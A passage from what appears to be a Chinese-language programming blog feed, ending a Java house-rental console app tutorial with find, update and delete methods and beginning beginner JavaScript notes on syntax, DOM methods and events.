(index==-<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//房屋不存在</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//如果找到</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> index; i &lt; houseNums-<span class="hljs-number">1</span>; i++) &#123;<br>        houses[i] = houses[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    houses[--houseNums] =<span class="hljs-literal">null</span>; <span class="hljs-comment">//把当前存在的房屋信息的最后一个，置为null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>delHouse():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delHouse</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;-----------------删除房屋----------------&quot;</span>);<br>    System.out.print(<span class="hljs-string">&quot;请选择待删除的房屋编号(-1退出):&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">delId</span> <span class="hljs-operator">=</span> Utility.readInt();<br>    <span class="hljs-keyword">if</span> (delId == -<span class="hljs-number">1</span>)&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------放弃删除房屋信息----------------&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;确认是否删除(Y/N)：请小心选择：&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;请输入你的选择(Y/N)：&quot;</span>);<br>    <span class="hljs-type">char</span> <span class="hljs-variable">choice</span> <span class="hljs-operator">=</span> Utility.readConfirmSelection();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&#x27;Y&#x27;</span>)&#123;<br>        <span class="hljs-keyword">if</span> (houseService.del(delId))&#123;<br>            System.out.println(<span class="hljs-string">&quot;-----------------删除房屋信息成功----------------&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;-----------------房屋编号不存在，删除失败----------------&quot;</span>);<br>        &#125;<br>    &#125;<br>    System.out.println(<span class="hljs-string">&quot;-----------------删除完成----------------&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002165051175.png" alt="image-20221002165051175" style="zoom:50%;" /><h3 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h3><p>退出时需要确定Y&#x2F;N.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//完成退出确认</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Utility.readConfirmSelection();<br>    <span class="hljs-keyword">if</span> (c==<span class="hljs-string">&#x27;Y&#x27;</span>)&#123;<br>        loop = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="查找房屋信息"><a href="#查找房屋信息" class="headerlink" title="查找房屋信息"></a>查找房屋信息</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001850708.png" alt="image-20221002001850708" style="zoom:50%;" /></blockquote><p>思路：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002180351856.png" alt="image-20221002180351856" style="zoom:50%;" /><p>findHouse：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findHouse</span><span class="hljs-params">()</span>&#123;<br>  System.out.println(<span class="hljs-string">&quot;-----------------查找房屋----------------&quot;</span>);<br>  System.out.print(<span class="hljs-string">&quot;请输入你要查找的id：&quot;</span>);<br>  <span class="hljs-type">int</span> <span class="hljs-variable">findId</span> <span class="hljs-operator">=</span> Utility.readInt();<br>  <span class="hljs-comment">//调用</span><br>  <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> houseService.find(findId);<br>  <span class="hljs-keyword">if</span> (house != <span class="hljs-literal">null</span>)&#123;<br>    System.out.println(house);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;-----------------查找房屋不存在----------------&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>find：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> House <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> findId)</span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; houseNums; i++) &#123;<br>    <span class="hljs-keyword">if</span> (findId==houses[i].getId())&#123;<br>      <span class="hljs-keyword">return</span> houses[i];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修改房屋信息"><a href="#修改房屋信息" class="headerlink" title="修改房屋信息"></a>修改房屋信息</h3><blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002002105678.png" alt="image-20221002002105678" style="zoom:50%;" /></blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002183701865.png" alt="image-20221002183701865" style="zoom:50%;" /><p>可使用find方法来判断id是否存在。</p><p>updateHouse():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;-----------------修改客户----------------&quot;</span>);<br>    System.out.print(<span class="hljs-string">&quot;请选择待修改房屋编号(-1退出):&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">updateId</span> <span class="hljs-operator">=</span> Utility.readInt();<br>    <span class="hljs-keyword">if</span> (updateId==-<span class="hljs-number">1</span>)&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------放弃修改房屋信息----------------&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//根据输入的updateId，查找对象</span><br>    <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> houseService.find(updateId);<br>    <span class="hljs-keyword">if</span> (house == <span class="hljs-literal">null</span>)&#123;<br>        System.out.println(<span class="hljs-string">&quot;-----------------修改房屋信息的编号不存在----------------&quot;</span>);<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;姓名(&quot;</span>+house.getName()+<span class="hljs-string">&quot;)：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;&quot;</span>); <span class="hljs-comment">//如果用户直接回车，表示不修改</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;&quot;</span>.equals(name))&#123;<br>        house.setName(name);<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;电话(&quot;</span>+house.getPhone()+<span class="hljs-string">&quot;)：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span>  Utility.readString(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;&quot;</span>.equals(phone))&#123;<br>        house.setPhone(phone);<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;地址(&quot;</span>+house.getAddress()+<span class="hljs-string">&quot;)：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;&quot;</span>.equals(address))&#123;<br>        house.setAddress(address);<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;月租(&quot;</span>+house.getRent()+<span class="hljs-string">&quot;)：&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">rent</span> <span class="hljs-operator">=</span> Utility.readInt(-<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (rent !=-<span class="hljs-number">1</span>)&#123;<br>        house.setRent(rent);<br>    &#125;<br>    System.out.print(<span class="hljs-string">&quot;状态(&quot;</span>+house.getState()+<span class="hljs-string">&quot;)：&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> Utility.readString(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;&quot;</span>.equals(state))&#123;<br>        house.setState(state);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002183835067.png" alt="image-20221002183835067" style="zoom:50%;" /><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002185646073.png" alt="image-20221002185646073"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript笔记</title>
    <link href="/2023/10/25/2023/JavaScript%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/25/2023/JavaScript%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>自用笔记。</p><p><a href="#start" style="color:pink;">跳到指南</a></p><h1 id="简介-amp-基础"><a href="#简介-amp-基础" class="headerlink" title="简介&amp;基础"></a>简介&amp;基础</h1><p>JavaScript是一种具有函数有限特性的轻量级、解释型（即时编译型[just-in-time compiling]）编程语言。</p><p>进一步说，JavaScript 是一种<strong>基于原型、多范式、单线程的动态语言</strong>，并且<strong>支持</strong>面向对象、命令式和声明式（如函数式编程）风格。</p><p>（严格来说，JavaScript并不算面向对象编程语言。ES6后新增了class，使它更贴合传统的oop。但在Netscape官方定义，JavaScript是基于对象的语言。）</p><p>JavaScript是Netscape网景公司的产品（而java是sun家的，现在是Oracle）。</p><p>JavaScript没有Java的静态类型和强类型检查特性，但JavaScript 遵循了 Java 的表达式语法，命名规范以及基础流程控制。</p><table><thead><tr><th>JavaScript</th><th>Java</th></tr></thead><tbody><tr><td>面向对象。不区分对象类型。通过原型机制继承，任何对象的属性和方法均可以被动态添加。</td><td>基于类系统。分为类和实例，通过类层级的定义实现继承。不能动态增加对象或类的属性或方法。</td></tr><tr><td>变量类型不需要提前声明 (动态类型)。</td><td>变量类型必须提前声明 (静态类型)。</td></tr><tr><td>不能直接自动写入硬盘。</td><td>可以直接自动写入硬盘。</td></tr></tbody></table><p><strong>Js是弱类型，Java是强类型</strong>。</p><ul><li><p>强类型就是定义变量的时候，类型已确定，并且不可变。</p></li><li><p>弱类型就是类型可变。</p></li></ul><p>JavaScript的标准化组织是<strong>ECMA</strong>。遵循该标准化版本的 JavaScript 被称作 ECMAScript。</p><p><strong>特点</strong>：</p><ol><li>交互性（它可以做的就是信息的动态交互）</li><li>安全性（不允许直接访问本地硬盘）</li><li>跨平台性（只要是可以解释Js的浏览器都可以执行，和平台无关）</li></ol><p><strong>引入方式</strong>：</p><ul><li><p>内部：在head或body中，使用script标签来书写。</p></li><li><p>外部：外部文件引入。（这样更有序，更易于复用）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>注释</strong>：</p><ul><li>单行：<code>//</code></li><li>多行：<code>/* */</code></li></ul><p>解决脚本阻塞问题：<strong>async、defer</strong></p><ul><li>async：浏览器遇到 <code>async</code> 脚本时不会阻塞页面渲染，而是直接下载然后运行。</li><li>defer：脚本将按照页面出现的顺序加载。在页面内容全部加载完毕之前，脚本不会运行。</li></ul><p><strong>声明变量</strong>：<strong>var</strong>或<strong>let</strong>关键字后加上变量名</p><ul><li><p>var可以多次声明相同名称的变量，而let不能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">&quot;Chris&quot;</span>;<br><span class="hljs-comment">//let myName = &quot;Bob&quot;; ——错误</span><br>myName = <span class="hljs-string">&quot;Bob&quot;</span>;<br></code></pre></td></tr></table></figure></li></ul><p><strong>变量类型</strong></p><ul><li><p>Number：数字。例如整数、小数。</p></li><li><p>String：字符串。</p></li><li><p>Boolean</p></li><li><p>Array：数组。方括号括起来，不同的值用逗号隔开。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> myNameArray = [<span class="hljs-string">&quot;Chris&quot;</span>, <span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;Jim&quot;</span>];<br>myNameArray[<span class="hljs-number">0</span>]; <span class="hljs-comment">// should return &#x27;Chris&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>Object：对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> dog = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Spot&quot;</span>, <span class="hljs-attr">breed</span>: <span class="hljs-string">&quot;Dalmatian&quot;</span> &#125;;<br>dog.<span class="hljs-property">name</span>;<br></code></pre></td></tr></table></figure></li></ul><p>转换大小写：<strong>toLowerCase()<strong>和</strong>toUpperCase()</strong></p><p>查找字符串：<strong>indexOf()</strong></p><p>提取字符：<strong>slice()</strong> 。提取字符串的一部分，并将其作为新字符串返回，而不修改原始字符串。<code>slice(indexStart, indexEnd)</code></p><p><strong>字符串转数组</strong>：</p><ul><li>**split()**：通过搜索模式将字符串分割成一个有序的子串列表，将这些子串放入一个数组，并返回该数组。例如<code>myData.split(&quot;,&quot;)</code></li></ul><p><strong>数组转字符串</strong>：</p><ul><li>**join()**：和split()相反。join() 方法将一个数组（或一个类数组对象）的所有元素连接成一个字符串并返回这个字符串，用逗号或指定的分隔符字符串分隔。</li><li><strong>toString()</strong></li></ul><p>添加删除数组项：push()、pop()</p><p><strong>逻辑运算符</strong>：**&amp;&amp;<strong>逻辑与，</strong>||**逻辑或</p><p><strong>条件语句</strong>：</p><ul><li><p>if……else</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (condition) &#123;<br>  <span class="hljs-comment">/* 条件为真时运行的代码 */</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">/* 否则，运行其他的代码 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>switch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">switch</span> (表达式) &#123;<br>  <span class="hljs-keyword">case</span> 选择<span class="hljs-number">1</span>:<br>    运行这段代码<br>    <span class="hljs-keyword">break</span>;<br><br>  <span class="hljs-keyword">case</span> 选择<span class="hljs-number">2</span>:<br>    否则，运行这段代码<br>    <span class="hljs-keyword">break</span>;<br><br>  <span class="hljs-comment">// 包含尽可能多的情况</span><br><br>  <span class="hljs-attr">default</span>:<br>    实际上，仅仅运行这段代码<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>三元运算符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">condition ? 运行这段代码 : 否则，运行这段代码<br><br>select.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;change&quot;</span>, <span class="hljs-function">() =&gt;</span><br>  select.<span class="hljs-property">value</span> === <span class="hljs-string">&quot;black&quot;</span><br>    ? <span class="hljs-title function_">update</span>(<span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>)<br>    : <span class="hljs-title function_">update</span>(<span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;black&quot;</span>),<br>);<br></code></pre></td></tr></table></figure></li></ul><p><strong>循环</strong>：</p><ul><li><p>for循环</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (initializer; exit-condition; final-expression) &#123;<br>  <span class="hljs-comment">// code to run</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>break退出循环</p></li><li><p>continue跳过迭代</p></li><li><p>while循环</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">initializer<br><span class="hljs-keyword">while</span> (exit-condition) &#123;<br>  <span class="hljs-comment">// code to run</span><br><br>  final-expression<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>do…while</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">initializer<br><span class="hljs-keyword">do</span> &#123;<br>  <span class="hljs-comment">// code to run</span><br><br>  final-expression<br>&#125; <span class="hljs-keyword">while</span> (exit-condition)<br></code></pre></td></tr></table></figure></li></ul><p><strong>函数</strong></p><ul><li><p>定义、调用函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_">myFunction</span>();<br><span class="hljs-comment">// 调用一次该函数</span><br></code></pre></td></tr></table></figure></li><li><p>匿名函数：无函数名的函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">myButton.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><p><strong>Document</strong>：Document接口表示任何在浏览器接入的网页，并作为网页内容的入口。</p><p>DOM（文档对象模型）的内置方法：</p><ul><li><p><strong><code>document.querySelector()</code></strong> </p><p>返回文档中与<strong>指定选择器或选择器组</strong>匹配的<strong>第一个</strong>Element对象。</p><p>若找不到匹配项，返回null。</p></li><li><p><strong><code>document.createElement(tagName[, options]);</code></strong></p><p>创建一个由标签名称 <em>tagName</em> 指定的 HTML 元素。</p></li><li><p><strong><code>element.setAttribute(name, value);</code></strong></p><p>设置指定元素上的某个属性值。如果属性已经存在，则更新该值；否则，使用指定的名称和值添加一个新的属性。</p></li><li><p><strong><code>element.appendChild(aChild)</code></strong></p><p>将一个节点附加到指定父节点的子节点列表的末尾处。</p></li><li><p><strong><code>Node.textContent;</code></strong></p><p>表示一个节点及其后代的文本内容。</p></li></ul><p>例（<a href="https://mdn.github.io/learning-area/javascript/building-blocks/functions/function-stage-4.html">运行效果</a>）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Display message box<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;button&quot;</span>);</span><br><span class="language-javascript">      btn.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">displayMessage</span>(<span class="hljs-string">&quot;Brian: Hi there, how are you today?&quot;</span>, <span class="hljs-string">&quot;chat&quot;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">      <span class="hljs-keyword">function</span> <span class="hljs-title function_">displayMessage</span>(<span class="hljs-params">msgText, msgType</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> html = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;html&quot;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> panel = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="language-javascript">        panel.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;msgBox&quot;</span>);</span><br><span class="language-javascript">        html.<span class="hljs-title function_">appendChild</span>(panel);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> msg = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;p&quot;</span>);</span><br><span class="language-javascript">        msg.<span class="hljs-property">textContent</span> = msgText;</span><br><span class="language-javascript">        panel.<span class="hljs-title function_">appendChild</span>(msg);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> closeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;button&quot;</span>);</span><br><span class="language-javascript">        closeBtn.<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;x&quot;</span>;</span><br><span class="language-javascript">        panel.<span class="hljs-title function_">appendChild</span>(closeBtn);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        closeBtn.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          panel.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(panel);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (msgType === <span class="hljs-string">&quot;warning&quot;</span>) &#123;</span><br><span class="language-javascript">          msg.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundImage</span> = <span class="hljs-string">&quot;url(warning.png)&quot;</span>;</span><br><span class="language-javascript">          panel.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&quot;red&quot;</span>;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msgType === <span class="hljs-string">&quot;chat&quot;</span>) &#123;</span><br><span class="language-javascript">          msg.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundImage</span> = <span class="hljs-string">&quot;url(chat.png)&quot;</span>;</span><br><span class="language-javascript">          panel.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&quot;aqua&quot;</span>;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">          msg.<span class="hljs-property">style</span>.<span class="hljs-property">paddingLeft</span> = <span class="hljs-string">&quot;20px&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>关于随机数（随机范围min到max）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getRndInteger</span>(<span class="hljs-params">min, max</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (max - min + <span class="hljs-number">1</span>) ) + min;<br>&#125;<br><span class="hljs-comment">//例如5-10</span><br><span class="hljs-comment">//max-min+1 = 6</span><br><span class="hljs-comment">//Math.random()随机出的数字在0-1之间(大于等于0小于1）。乘以6就是0-6之间。再加上最小数，就是5-11之间（不含11，最大为10.xxx……）。</span><br><span class="hljs-comment">//Math.floor()向下取整，也就是在5-10之间的整数。</span><br></code></pre></td></tr></table></figure><p><strong>事件</strong>：为了对一个事件做出反应，你要给它附加一个<strong>事件处理器</strong>。</p><ul><li><p>EventTarget.<strong>addEventListener()</strong> ：将指定的<strong>监听器</strong>注册到 EventTarget 上，当该对象<strong>触发指定的事件</strong>时，指定的回调函数就会被执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span 